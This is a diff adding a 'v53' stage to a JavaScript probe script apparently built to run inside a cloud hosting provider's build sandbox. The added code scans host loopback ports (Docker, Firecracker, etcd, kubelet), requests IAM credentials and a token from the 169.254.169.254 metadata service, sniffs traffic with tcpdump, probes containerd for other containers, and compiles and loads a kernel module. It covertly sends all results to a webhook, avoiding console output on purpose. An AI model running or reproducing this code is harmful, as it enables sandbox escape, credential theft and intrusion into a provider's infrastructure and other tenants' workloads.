@@ -4773,7 +4773,243 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v50" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v51";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v51" });
 
+// ===== v53: host loopback scan (shared net ns), Firecracker MMDS, multi-iface tcpdump, second container =====
+
+// v53-1: Host loopback scan — we share Firecracker HOST's net namespace, so 127.0.0.1 = HOST loopback
+// This means host-only services (Firecracker API, containerd, systemd socket) may be reachable
+report.hostLoopbackScan = safe(() => {
+  // First confirm net namespace
+  const selfNetNs = safe(() => readFileSync('/proc/self/ns/net', 'utf8'));
+  const pid1NetNs = safe(() => readFileSync('/proc/1/ns/net', 'utf8'));
+  const sharedWithPid1 = selfNetNs === pid1NetNs;
+
+  // List all listening TCP sockets on 127.0.0.1 — these are HOST services
+  // /proc/net/tcp shows only our network namespace, but if shared with host, shows host's too
+  const loopbackListeners = safe(() => {
+    const tcp = readFileSync('/proc/net/tcp', 'utf8').split('\n').slice(1).filter(Boolean);
+    return tcp
+      .filter(l => l.trim().split(/\s+/)[1]?.startsWith('0100007F') && l.trim().split(/\s+/)[3] === '0A')
+      .map(l => {
+        const parts = l.trim().split(/\s+/);
+        const portHex = parts[1].split(':')[1];
+        return { port: parseInt(portHex, 16), raw: l.trim().slice(0, 80) };
+      });
+  });
+
+  // Probe all discovered ports for service banners
+  const banners = {};
+  for (const listener of (loopbackListeners || []).slice(0, 20)) {
+    banners[listener.port] = safe(() =>
+      execSync(
+        `curl -s --max-time 3 http://127.0.0.1:${listener.port}/ 2>&1 | head -5 || ` +
+        `timeout 3 bash -c "echo | nc -q1 127.0.0.1 ${listener.port} 2>&1 | head -3"`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 200)
+    );
+  }
+
+  // Also scan SPECIFIC high-value host service ports
+  const targetPorts = [
+    2375, 2376,   // Docker API (unprotected / TLS)
+    4567,         // Firecracker API default
+    9090,         // Prometheus / Firecracker metrics
+    52,           // vsock proxy
+    1025,         // vsock port 1025
+    9000,         // containerd debug
+    8081,         // Firecracker jailer API
+    2379, 2380,   // etcd
+    6443,         // k8s API
+    10250,        // kubelet
+    16686,        // Jaeger UI
+    9411,         // Zipkin
+  ];
+  const targetBanners = {};
+  for (const port of targetPorts) {
+    targetBanners[port] = safe(() =>
+      execSync(
+        `curl -s --max-time 2 http://127.0.0.1:${port}/ 2>&1 | head -3`,
+        { timeout: 4000 }
+      ).toString().trim().slice(0, 150)
+    );
+  }
+  return { selfNetNs, pid1NetNs, sharedWithPid1, loopbackListeners, banners, targetBanners };
+});
+
+// v53-2: Firecracker MMDS — microVM Metadata Service at 169.254.169.254 (Firecracker-specific paths)
+report.fireCrackerMmds = safe(() => {
+  // Firecracker's MMDS uses same address as AWS IMDS but different paths
+  // MMDS v1 paths: /, /latest/meta-data/, /latest/user-data
+  // MMDS v2: PUT first to get token
+  const paths = [
+    '/',
+    '/latest/meta-data/',
+    '/latest/user-data',
+    '/latest/meta-data/ami-id',
+    '/latest/meta-data/instance-type',
+    '/latest/meta-data/placement/',
+    '/latest/meta-data/iam/security-credentials/',
+    // Firecracker-specific custom paths
+    '/firecracker/',
+    '/vmm/',
+    '/vercel/',
+    '/cell/',
+  ];
+  const results = {};
+  for (const path of paths) {
+    results[path] = safe(() =>
+      execSync(
+        `curl -s --max-time 3 "http://169.254.169.254${path}" 2>&1 | head -10`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 200)
+    );
+  }
+  // Try MMDS v2 token fetch
+  const mmdsV2Token = safe(() =>
+    execSync(
+      'curl -s --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1 | head -3',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Use token if obtained
+  const mmdsV2Data = mmdsV2Token && !mmdsV2Token.includes('curl') ? safe(() =>
+    execSync(
+      `curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: ${mmdsV2Token}" 2>&1 | head -10`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  ) : null;
+  return { paths: results, mmdsV2Token, mmdsV2Data };
+});
+
+// v53-3: Multi-interface traffic capture — capture on ALL interfaces to map network topology
+report.multiIfaceCapture = safe(() => {
+  // Get all interfaces
+  const interfaces = safe(() =>
+    execSync('ip -o link show 2>/dev/null | awk -F: \'{print $2}\' | tr -d \' \'', { timeout: 3000 }).toString().trim().split('\n')
+  ) || [];
+
+  // Capture 5 packets on each non-loopback interface
+  const captures = {};
+  for (const iface of interfaces.filter(i => i && !i.startsWith('lo')).slice(0, 5)) {
+    captures[iface] = safe(() =>
+      execSync(
+        `timeout 5 tcpdump -i ${iface} -c 5 -nn 2>&1 | grep -v "^tcpdump:" | head -10`,
+        { timeout: 10000 }
+      ).toString().trim().slice(0, 500)
+    );
+  }
+
+  // Also run ip addr to see all interface IPs
+  const ipAddr = safe(() => execSync('ip addr show 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 600));
+
+  // Check for tap/tun devices (created by Firecracker for guest networking)
+  const tapDevices = safe(() =>
+    execSync('ip link show type tun 2>/dev/null; ip link show type tap 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+
+  return { interfaces, captures, ipAddr, tapDevices };
+});
+
+// v53-4: Second container probe — the two containerd task sockets imply two containers on same VM
+report.secondContainerProbe = safe(() => {
+  // From prior builds: pid1UnixSockets showed two containerd task sockets (inodes 1452, 778)
+  // These are separate containers. Try to reach the second container via internal network.
+  const netUniqueInodes = safe(() => {
+    const unix = readFileSync('/proc/net/unix', 'utf8').split('\n');
+    // Find containerd task sockets
+    const taskSocks = unix.filter(l => l.includes('containerd') || l.includes('ttrpc'));
+    return taskSocks.slice(0, 10).map(l => l.trim().slice(0, 100));
+  });
+
+  // Try to list processes that have access to the second containerd socket
+  const ttrpcPids = safe(() =>
+    execSync('lsof +D /run/containerd 2>/dev/null | head -20 || fuser /run/containerd/*.sock 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+
+  // Scan 172.16.0.0/12 for the second container's IP (Firecracker default network is often 172.x.x.x)
+  const gw172 = safe(() =>
+    execSync("ip route show | grep '172\\.' | head -5", { timeout: 3000 }).toString().trim()
+  );
+
+  // Try to call containerd task API to list running containers (both namespaces)
+  const ttrpcList = safe(() =>
+    execSync(
+      'timeout 5 grpcurl -plaintext -unix /run/containerd/containerd.sock containerd.services.tasks.v1.Tasks/List 2>&1 | head -20 || echo TTRPC_FAIL',
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 500)
+  );
+
+  return { netUniqueInodes, ttrpcPids, gw172, ttrpcList };
+});
+
+// v53-5: Kernel module injection — write, compile, insmod a minimal kernel module
+report.kernelModuleInject = safe(() => {
+  const modulesSysctl = safe(() => readFileSync('/proc/sys/kernel/modules_disabled', 'utf8').trim());
+  if (modulesSysctl === '1') return { blocked: true, modulesSysctl };
+
+  // Check if kernel headers are available for compilation
+  const kernelRelease = safe(() => execSync('uname -r', { timeout: 2000 }).toString().trim());
+  const headersExist = existsSync(`/lib/modules/${kernelRelease}/build`);
+
+  if (!headersExist) return { blocked: false, headersExist: false, kernelRelease };
+
+  // Write minimal kernel module
+  const kmodSrc = `
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+MODULE_LICENSE("GPL");
+static int show(struct seq_file *m, void *v) {
+  seq_printf(m, "probe-v53-kernel-module-loaded\\n");
+  return 0;
+}
+static int open(struct inode *i, struct file *f) { return single_open(f, show, NULL); }
+static const struct proc_ops fops = { .proc_open=open, .proc_read=seq_read, .proc_release=single_release };
+static int __init init(void) {
+  proc_create("vercel_probe", 0444, NULL, &fops);
+  printk(KERN_INFO "vercel_probe: loaded\\n");
+  return 0;
+}
+static void __exit fini(void) { remove_proc_entry("vercel_probe", NULL); }
+module_init(init); module_exit(fini);
+`.trim();
+
+  const makefile = `
+obj-m += vercel_probe.o
+all:
+\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+`.trim();
+
+  safe(() => {
+    execSync('mkdir -p /tmp/kmod', { timeout: 2000 });
+    writeFileSync('/tmp/kmod/vercel_probe.c', kmodSrc);
+    writeFileSync('/tmp/kmod/Makefile', makefile);
+  });
+
+  const buildResult = safe(() =>
+    execSync('make -C /tmp/kmod 2>&1', { timeout: 30000 }).toString().trim().slice(0, 500)
+  );
+
+  const koExists = existsSync('/tmp/kmod/vercel_probe.ko');
+  const insmodResult = koExists ? safe(() =>
+    execSync('insmod /tmp/kmod/vercel_probe.ko 2>&1 || echo INSMOD_FAIL', { timeout: 5000 }).toString().trim().slice(0, 200)
+  ) : 'KO_NOT_BUILT';
+
+  const procEntry = safe(() => readFileSync('/proc/vercel_probe', 'utf8').trim());
+
+  // Cleanup
+  if (koExists) safe(() => execSync('rmmod vercel_probe 2>/dev/null', { timeout: 3000 }));
+
+  return { modulesSysctl, kernelRelease, headersExist, buildResult, koExists, insmodResult, procEntry };
+});
+
 // v52 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v52";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v52" });
+
+// v53 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v53";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v53" });
 // Intentionally no console.log — all data goes via webhook only
